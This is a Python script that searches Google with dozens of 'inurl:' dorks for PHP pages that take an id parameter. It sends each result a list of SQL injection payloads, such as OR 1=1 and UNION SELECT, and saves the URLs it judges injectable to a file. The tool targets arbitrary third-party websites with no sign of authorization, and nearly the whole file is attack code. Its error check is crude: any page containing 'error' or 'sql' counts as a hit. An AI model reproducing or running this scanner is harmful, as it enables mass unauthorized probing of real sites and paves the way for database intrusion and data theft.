import requests
from bs4 import BeautifulSoup
import urllib.parse
import time
import logging
from colorama import Fore, Style, init
import random

# Initialize Colorama
init(autoreset=True)

# Configuration
CONFIG = {
    "vulnerable_file": 'vulnerable2.txt',
    "sqli_payloads": [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' OR 'x'='x",
        "' OR 1=1#",
        '" OR "1"="1',
        '" OR 1=1 --',
        "' UNION SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' AND 1=CONVERT(int, (SELECT @@version))--",
        "' OR EXISTS(SELECT * FROM sysobjects WHERE xtype='U')--",
        "' AND (SELECT 1 FROM dual WHERE EXISTS(SELECT * FROM information_schema.tables))--",
        "' OR (SELECT 1 FROM dual WHERE LENGTH(CHAR(13)))--",
        "' OR (SELECT 1 FROM dual WHERE 1=1)--",
        "' AND 1=(SELECT COUNT(*) FROM tabname WHERE columnname LIKE '%pattern%')--",
        "' OR (SELECT * FROM users WHERE username LIKE '%admin%')--"
    ],
    "num_results": 10,
    "search_delay": 2,  # Delay between Google searches
    "check_delay": 2,   # Delay between vulnerability checks
    "google_search_url": "https://www.google.com/search",
    "user_agent": 'Mozilla/5.0',
    "dorks": [
        "inurl:index.php?id=",
        "inurl:product.php?id=",
        "inurl:page.php?id=",
        "inurl:news.php?id=",
        "inurl:post.php?id=",
        "inurl:view.php?id=",
        "inurl:article.php?id=",
        "inurl:content.php?id=",
        "inurl:show.php?id=",
        "inurl:details.php?id=",
        "inurl:profile.php?id=",
        "inurl:search.php?id=",
        "inurl:detail.php?id=",
        "inurl:category.php?id=",
        "inurl:showitem.php?id=",
        "inurl:item.php?id=",
        "inurl:searchresult.php?id=",
        "inurl:download.php?id=",
        "inurl:fetch.php?id=",
        "inurl:review.php?id=",
        "inurl:comment.php?id=",
        "inurl:viewitem.php?id=",
        "inurl:print.php?id=",
        "inurl:upload.php?id=",
        "inurl:export.php?id=",
        "inurl:edit.php?id=",
        "inurl:admin.php?id=",
        "inurl:admin_login.php?id=",
        "inurl:login.php?id=",
        "inurl:reg.php?id=",
        "inurl:reset.php?id=",
        "inurl:details.php?item=",
        "inurl:showdetails.php?id=",
        "inurl:itemdetails.php?id=",
        "inurl:viewdetails.php?id=",
        "inurl:viewpost.php?id=",
        "inurl:postdetails.php?id=",
        "inurl:movie.php?id=",
        "inurl:tvshow.php?id=",
        "inurl:books.php?id=",
        "inurl:productdetails.php?id=",
        "inurl:searchresult.php?query=",
        "inurl:searchresults.php?id=",
        "inurl:searchitems.php?id=",
        "inurl:searchpage.php?id=",
        "inurl:query.php?id=",
        "inurl:product_detail.php?id=",
        "inurl:catalog.php?id=",
        "inurl:listing.php?id=",
        "inurl:page_detail.php?id=",
        "inurl:order.php?id=",
        "inurl:news_article.php?id=",
        "inurl:post_detail.php?id=",
        "inurl:article_detail.php?id=",
        "inurl:review_detail.php?id=",
        "inurl:feedback.php?id=",
        "inurl:comment_detail.php?id=",
        "inurl:contact.php?id=",
        "inurl:profile_view.php?id=",
        "inurl:edit_profile.php?id=",
        "inurl:update_profile.php?id=",
        "inurl:settings.php?id=",
        "inurl:preferences.php?id=",
        "inurl:admin_panel.php?id=",
        "inurl:admin_dashboard.php?id=",
        "inurl:admin_actions.php?id=",
        "inurl:admin_edit.php?id=",
        "inurl:admin_manage.php?id=",
        "inurl:admin_update.php?id=",
        "inurl:admin_delete.php?id=",
        "inurl:admin_add.php?id=",
        "inurl:admin_view.php?id=",
        "inurl:admin_user.php?id=",
        "inurl:admin_roles.php?id=",
        "inurl:admin_settings.php?id=",
        "inurl:admin_logs.php?id=",
        "inurl:admin_activity.php?id=",
        "inurl:admin_profile.php?id=",
        "inurl:admin_dashboard.php?id=",
        "inurl:admin_manage_users.php?id=",
        "inurl:admin_site.php?id=",
        "inurl:admin_content.php?id=",
        "inurl:admin_comments.php?id=",
        "inurl:admin_feedback.php?id=",
        "inurl:admin_reports.php?id=",
        "inurl:admin_statistics.php?id=",
        "inurl:admin_configuration.php?id=",
        "inurl:admin_options.php?id=",
        "inurl:admin_preferences.php?id=",
        "inurl:admin_customizations.php?id="
    ]
}

# Setup logging
logging.basicConfig(
    filename='sql_injection_check.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def save_vulnerable_url(url):
    """Save the URL to the vulnerable file."""
    try:
        with open(CONFIG["vulnerable_file"], 'a') as file:
            file.write(url + '\n')
        logging.info(f"Saved potentially vulnerable URL: {url}")
    except IOError as e:
        logging.error(f"Failed to save URL {url}: {e}")

def google_search(query, num_results=10):
    """Perform Google search and return URLs."""
    links = []
    start = 0

    while len(links) < num_results:
        params = {'q': query, 'start': start}
        headers = {'User-Agent': CONFIG["user_agent"]}

        try:
            response = requests.get(CONFIG["google_search_url"], params=params, headers=headers)
            if response.status_code == 403:
                logging.warning(f"Access denied for search query: {query}. Possible rate limit.")
                break
            elif response.status_code != 200:
                logging.error(f"Failed to fetch search results: {response.status_code}")
                break

            soup = BeautifulSoup(response.text, 'html.parser')
            for item in soup.find_all('a'):
                href = item.get('href')
                if href and href.startswith('/url?q='):
                    url = urllib.parse.unquote(href.split('/url?q=')[1].split('&')[0])
                    if url not in links:
                        links.append(url)

            if len(links) >= num_results:
                break

            start += 10
            time.sleep(CONFIG["search_delay"])

        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            time.sleep(CONFIG["search_delay"])  # Wait before retrying

    return links[:num_results]

def check_sqli(url):
    """Check if a URL is potentially vulnerable to SQL injection."""
    headers = {'User-Agent': CONFIG["user_agent"]}

    for payload in CONFIG["sqli_payloads"]:
        test_url = f"{url}?test={urllib.parse.quote(payload)}"
        try:
            response = requests.get(test_url, headers=headers, timeout=10)

            # Check for common SQL error patterns in the response
            if any(error in response.text.lower() for error in ["error", "sql", "syntax"]):
                logging.info(f"Potential SQLi vulnerability detected at: {test_url}")
                print(Fore.GREEN + f"Potential vulnerability found: {test_url}")
                save_vulnerable_url(test_url)
                return True

        except requests.RequestException as e:
            logging.error(f"Request to {test_url} failed: {e}")
            time.sleep(CONFIG["check_delay"])  # Wait before retrying

        time.sleep(CONFIG["check_delay"])

    print(Fore.RED + f"No vulnerability found at: {url}")
    return False

def main():
    """Main function to perform searches and check for SQL injection vulnerabilities."""
    # Shuffle the dorks list to ensure different dorks are used each run
    random.shuffle(CONFIG["dorks"])

    for dork in CONFIG["dorks"]:
        print(Fore.YELLOW + f"Searching with dork: {dork}")
        urls = google_search(dork, CONFIG["num_results"])

        for url in urls:
            print(Fore.CYAN + f"Checking {url} for SQLi vulnerability...")
            if check_sqli(url):
                print(Fore.GREEN + f"Potential vulnerability found: {url}")
            else:
                print(Fore.RED + f"No vulnerability found at: {url}")

if __name__ == "__main__":
    main()
